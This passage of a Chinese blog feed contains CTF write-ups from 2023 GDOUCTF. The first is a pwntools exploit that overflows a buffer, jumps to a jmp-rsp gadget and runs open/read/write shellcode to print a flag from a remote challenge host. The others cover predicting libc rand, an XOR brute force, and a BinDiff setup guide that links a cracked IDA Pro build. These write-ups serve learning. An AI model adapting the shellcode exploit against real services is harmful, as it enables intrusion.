keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/真男人下120层/bin"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node2.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28852</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    v3 <span class="token operator">=</span> lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v3<span class="token punctuation">)</span>    number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please input a guess num:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span>jmp_esp <span class="token operator">=</span> <span class="token number">0x40094E</span>data_address <span class="token operator">=</span> <span class="token number">0x601000</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 调用read函数，在data_address 0x601000处写入orw内容</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'mov rax,0x601000; call rax'</span><span class="token punctuation">)</span>  <span class="token comment"># call ax寄存器，调用执行data_address 0x601000处的orw</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>  <span class="token comment"># 打满变量空间和rbp寄存器的字节</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>jmp_esp<span class="token punctuation">)</span>  <span class="token comment"># 返回地址写成jmp_esp，继续运行当前sp后续指令，填写别的返回地址就无法控制程序后面的执行流程了</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30; jmp rsp'</span><span class="token punctuation">)</span>  <span class="token comment"># 此时sp已经离shellcode地址偏移0x30,这里把sp挪回到shellcode地址并跳转到shellcode</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your door\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>orw <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打开本地的flag文件</span>orw <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 文件描述符3:其它打开的文件，将flag内容写入到data_address + 0x100地址处</span>orw <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 文件描述符1:输出到屏幕，输出地址data_address + 0x100处存储的flag内容</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>orw<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中的一道 Pwn 题，</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2023GDOUCTF-真男人下120层</title>
    <link href="https://www.4ss1du0us.cn/2023/0419ea1fe8.html"/>
    <id>https://www.4ss1du0us.cn/2023/0419ea1fe8.html</id>
    <published>2023-04-26T09:52:37.000Z</published>
    <updated>2023-05-12T11:46:29.102Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>使用 <code>ctypes</code> 库生成伪随机数</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）2023GDOUCTF-真男人下120层</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>首先查看文件：<br><img src="https://s2.loli.net/2023/05/12/qLbTtHBhjpnc8MC.png" alt="2023GDOUCTF-真男人就下120层1.png"></p></li><li><p>用 IDA 查看代码逻辑：<br><img src="https://s2.loli.net/2023/05/12/HWpLOcdT4aVoZKr.png" alt="2023GDOUCTF-真男人就下120层2.png"><br>输出信息有点杂乱，运行程序看一下：<br><img src="https://s2.loli.net/2023/05/12/AWtReXMF6UdHJBO.png" alt="2023GDOUCTF-真男人就下120层3.png"><br>这样就看得很清楚了，结合代码，程序大意如下：<br>① 首先根据一些数据生成伪随机数种子<br>② 让我们输入满足 <code>if ( rand() % 4 + 1 != v6 )</code> 条件的 <code>v6</code><br>③ 总共有 120 轮这样的校验，如果全部正确就执行 <code>cat_flag()</code> 函数<br><code>cat_flag()</code> 函数如下：<br><img src="https://s2.loli.net/2023/05/12/2bi9B7n8mtZAQKv.png" alt="2023GDOUCTF-真男人就下120层4.png"></p></li><li><p>所以接下来思路就很清晰了，按照伪随机数生成的方法构造 exp 重复输入 120 次即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/真男人下120层/bin"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28625</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    v3 <span class="token operator">=</span> lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v3<span class="token punctuation">)</span>    v4 <span class="token operator">=</span> lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">1522127470</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{bc2875e3-3232-4f70-8b78-006e8527f928}</p></blockquote><p><img src="https://s2.loli.net/2023/05/12/ngVdaKqeHFc1iYk.png" alt="2023GDOUCTF-真男人就下120层5.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中的一道 Pwn 题，比较简单，主要是利用 ctypes 生成伪随机数，循环输入 120 次即可得到 flag</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2023GDOUCTF-L!S!</title>
    <link href="https://www.4ss1du0us.cn/2023/0476db380f.html"/>
    <id>https://www.4ss1du0us.cn/2023/0476db380f.html</id>
    <published>2023-04-22T07:36:01.000Z</published>
    <updated>2023-05-11T05:23:24.439Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>对比两个程序中函数的相似性时，<code>BinDiff</code> 的使用方法</p></li><li><p>遇到未给定或难以确定的数据时，可以通过确定数据的范围，直接进行爆破</p></li><li><p>学到了一种新的转换小端序的方法</p></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）2023GDOUCTF-L!S!</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到两个文件：<br><img src="https://s2.loli.net/2023/04/21/LiyUWOJIjCcr6ol.png" alt="GDOUCTF2023-L!S!1.png"><br>文件名是个提示，<code>ls-original</code> 是原始的文件，<code>ls-patched</code> 是修改后的文件</p></li><li><p><strong>分别在 64 位 IDA 中打开这两个文件，发现他们的主函数内容几乎是一摸一样的</strong><br>（这里不贴图了，主函数特别长，有 1100 多行代码）</p></li><li><p><strong>结合文件的名字，这两个文件可能只有一点细微的差异，其他内容都是一样的</strong></p></li><li><p>识别二进制文件中的差异，可以使用 IDA 的 <code>BinDiff</code> 插件<br>首先下载 <code>BinDiff</code> （<em>在《二进制文件相似性》中有详细介绍</em>）<br>识别结果如下，按相似度低到高排序：<br><img src="https://s2.loli.net/2023/04/21/I8TFEnLNbeCq94k.png" alt="GDOUCTF2023-L!S!2.png"><br>发现只有 <code>extract_dirs_from files</code> 这个函数的相似度是 0.84，其他的都是 1<br>所以突破口肯定就在函数 <code>extract_dirs_from files</code> 中了</p></li><li><p>跟进一下<br><code>ls-original</code> 中的函数：<br><img src="https://s2.loli.net/2023/04/21/EFPJewpDU6S7MlW.png" alt="GDOUCTF2023-L!S!3.png"><br><code>ls-patched</code> 中的函数：<br><img src="https://s2.loli.net/2023/04/21/Q4zVMFv5Zl2yqX3.png" alt="GDOUCTF2023-L!S!4.png"></p></li><li><p>两边同时开对比看一下：<br><img src="https://s2.loli.net/2023/04/21/3wnemgXzrJkS4RG.png" alt="GDOUCTF2023-L!S!5.png"><br>左边多定义了三个变量，继续往下翻，发现差别主要就是在 <code>lmao[]</code> 的地方：<br><img src="https://s2.loli.net/2023/04/21/kpih2DLfs4E8WGO.png" alt="GDOUCTF2023-L!S!6.png"><br>黄色框中是相同的地方，主要是多出了红色框中的内容</p></li><li><p>将不同的部分提取出来：</p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">LABEL_7<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3F7D132A2A252822LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span>lmao <span class="token operator">=</span> <span class="token number">0x7D2E370A180F1604LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31207C7C381320LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x392A7F3F39132D13LL</span><span class="token punctuation">;</span>          v18 <span class="token operator">=</span> lmao<span class="token punctuation">;</span>          <span class="token keyword">do</span>            <span class="token operator">*</span>v18<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token operator">*</span>v7<span class="token punctuation">;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">!=</span> v18 <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span>lmao<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li><p>这里 <code>v18</code> 是一个指向 <code>lmao</code> 首地址的指针，而 <code>lmao</code> 的值是由 4 组 8 字节的数据拼接而成（<strong>小端序存放</strong>）<br>（<mark>注意：拼接得到 lmao 的值时，要先对每一组小端序数据进行还原</mark>）<br><code>while ( &amp;lmao[31] != v18 )</code> 控制 do while 循环一直将 <code>lmao</code> 中的所有元素全部与 <code>*v7</code> 的值进行异或<br>然后将异或结果输出</p></li><li><p>但是 <code>*v7</code> 的值在程序中无法得知，所以只能对 <code>*v7</code> 进行爆破<br>而 <code>*v7</code> 的取值只有 256 种可能，从 0 ~ 255</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> width_num<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 将小端序转换为正序  </span>    <span class="token keyword">global</span> <span class="token builtin">buffer</span>      hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 将int数据转换为十六进制的字符串  </span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">!=</span> width_num <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>          hex_str <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>width_num <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 位数不足width的用0凑齐  </span>    index <span class="token operator">=</span> width_num      <span class="token keyword">while</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 每两位string转换为十六进制int型数据  </span>        <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 将int型作为char存入buffer  </span>        index <span class="token operator">-=</span> <span class="token number">2</span>      <span class="token keyword">return</span> <span class="token builtin">buffer</span>      <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment">## 存放结果的列表  </span>  lmao1 <span class="token operator">=</span> <span class="token number">0x7D2E370A180F1604</span>  lmao2 <span class="token operator">=</span> <span class="token number">0x3F7D132A2A252822</span>  lmao3 <span class="token operator">=</span> <span class="token number">0x392A7F3F39132D13</span>  lmao4 <span class="token operator">=</span> <span class="token number">0x31207C7C381320</span>    little_endian<span class="token punctuation">(</span>lmao1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao3<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao4<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>  <span class="token comment"># [4, 22, 15, 24, 10, 55, 46, 125, 34, 40, 37, 42, 42, 19, 125, 63, 19, 45, 19, 57, 63, 127, 42, 57, 32, 19, 56, 124, 124, 32, 49]  </span>  <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 直接爆破key  </span>    flag <span class="token operator">=</span> <span class="token string">""</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key = "</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>      <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> key  <span class="token comment"># 逐个与key异或  </span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 对应的字符存入flag  </span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token string">'HZCTF'</span> <span class="token keyword">in</span> flag <span class="token keyword">or</span> <span class="token string">'NSSCTF'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>  <span class="token comment"># 只输出包含'HZCTF'或'NSSCTF'的结果  </span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><blockquote><p>发现官方 Writeup 有一种更方便地将一组小端序数据合并成一个正序数据的方法，记录一下<br>（<strong>但也有一个缺点，无法自己随意控制数据的长度，只能统一为相同长度</strong>）</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct    stack_bytes <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token number">0x7d2e370a180f1604</span><span class="token punctuation">,</span>      <span class="token number">0x3f7d132a2a252822</span><span class="token punctuation">,</span>      <span class="token number">0x392a7f3f39132d13</span><span class="token punctuation">,</span>      <span class="token number">0x31207c7c381320</span>  <span class="token punctuation">]</span>    <span class="token comment"># 将stack_bytes中的数据按照小端字节序打包为二进制数据  </span>xored_bytes <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;4Q"</span><span class="token punctuation">,</span> <span class="token operator">*</span>stack_bytes<span class="token punctuation">)</span>  <span class="token comment"># 其中，&lt; 表示小端序，Q代表一个无符号长整型  </span><span class="token comment"># 每个无符号长整型整数占8个字节，所以总共打包出来的字符串长度为32个字节  </span><span class="token comment"># b'\x04\x16\x0f\x18\n7.&#125;"(%**\x13&#125;?\x13-\x139?\x7f*9 \x138|| 1\x00'  </span>  <span class="token keyword">for</span> xorkey <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      output <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>byte <span class="token operator">^</span> xorkey <span class="token keyword">for</span> byte <span class="token keyword">in</span> xored_bytes<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token string">b"HZCTF&#123;"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>    <span class="token comment"># b'HZCTF&#123;b1ndiff_1s_a_us3ful_t00l&#125;L'  </span><span class="token comment"># （因为在lmao4的高位补了一个0，所以多输出了一个L）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{b1ndiff_1s_a_us3ful_t00l}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote><p><img src="https://s2.loli.net/2023/04/26/sDWTPoEv1MhICKi.png" alt="GDOUCTF2023-L!S!7.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛的一道逆向题，考察使用 BinDiff 插件查找两个程序的函数差异</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>二进制文件相似性</title>
    <link href="https://www.4ss1du0us.cn/2023/0411cad674.html"/>
    <id>https://www.4ss1du0us.cn/2023/0411cad674.html</id>
    <published>2023-04-21T09:23:13.000Z</published>
    <updated>2023-05-11T05:24:17.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BinDiff"><a href="#BinDiff" class="headerlink" title="BinDiff"></a>BinDiff</h2><blockquote><p>BinDiff 是一款二进制文件比对工具，可帮助漏洞研究人员和工程师快速找到反汇编代码的异同，同时，使用 BinDiff 还可以识别和隔离供应商提供的补丁中的漏洞修复</p></blockquote><hr><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li><p>BinDiff 是一款 java 程序，因此需要安装 <a href="https://www.oracle.com/java/technologies/downloads/#java8-windows">java jdk</a> 环境，用 <code>java -version</code> 验证安装是否成功</p></li><li><p>BinDiff 需要借助 IDA pro 进行分析，所以需要安装 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> （官方说明需要 6.8 及以上版本）</p></li><li><p><a href="https://www.zynamics.com/software.html">下载 BinDiff</a> （BinDiff 同时支持 Windows、Linux、Mac）<br>Windows 平台选择 <code>bindiffx.msi</code> 下载<br>像平时安装软件一样正常安装即可（<strong>低版本的 BinDiff 可能需要手动选择 IDA pro 的安装路径，否则 BinDiff 无法正常运行</strong>）</p></li></ol><hr><h3 id="在-BinDiff-中使用"><a href="#在-BinDiff-中使用" class="headerlink" title="在 BinDiff 中使用"></a>在 BinDiff 中使用</h3><blockquote><p>注意，BinDiff 并不能直接分析 exe 程序，只能分析 IDA 生成的 <code>.i64</code> 数据库文件</p></blockquote><ol><li><p>将想要对比相似性的两个二进制程序分别用 IDA 打开，待 IDA 分析完成后，关闭 IDA，IDA 会在本地生成一个数据库文件</p></li><li><p>在 BinDiff 中 <code>主菜单 ——&gt; File ——&gt; New Workspace</code> 新建一个工作空间<br>然后 <code>主菜单 ——&gt; Diffs ——&gt; New Diff</code>，选择生成的两个 IDA 数据库文件，待分析完成即可</p></li><li><p><strong>我就是这样操作的，但是会有一个报错，暂时还没有解决报错问题。。。</strong></p></li><li><p>如果你的情况跟我一样，那就试试下面的方法吧</p></li></ol><hr><h3 id="在-IDA-中使用"><a href="#在-IDA-中使用" class="headerlink" title="在 IDA 中使用"></a>在 IDA 中使用</h3><blockquote><p>如果还是报错，可以直接在 IDA 中使用 BinDiff 插件</p></blockquote><ol><li><p><strong>因为在安装 BinDiff 时，选择了本地正确的 IDA 安装目录，BinDiff 会把插件放在 IDA 的安装目录下的 plugins 文件夹里</strong>，如图：<br><img src="https://s2.loli.net/2023/04/21/b9JdlkN42KmjZUw.png" alt="二进制文件相似性2.png"><br>（如果没有的话，其实 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> 这个版本的 IDA 是内置了 BinDiff 的，可以直接使用）</p></li><li><p>打开其中一个 IDA 数据库文件，在 IDA 中使用快捷键：<code>Ctrl + 6</code><br><img src="https://s2.loli.net/2023/04/21/uGtCa4N9dinTcyH.png" alt="二进制文件相似性1.png"><br>点击 <code>Diff Database...</code>，然后选择另外一个二进制程序的 IDA 数据库文件<br>待分析完成，界面如下：<br><img src="https://s2.loli.net/2023/04/21/7jpvPNohI93WdEJ.png" alt="二进制文件相似性3.png"><br>到此，说明插件安装成功</p></li><li><p>左边绿色框中，<code>Similarity</code> 的值表示两个文件中函数的相似度，值越接近 1 表示越相似</p></li></ol>]]></content>
    
    
    <summary type="html">做逆向时遇到给出多个可执行文件，需要对比文件之间的差异性时，可以使用 Bindiff 进行操作</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
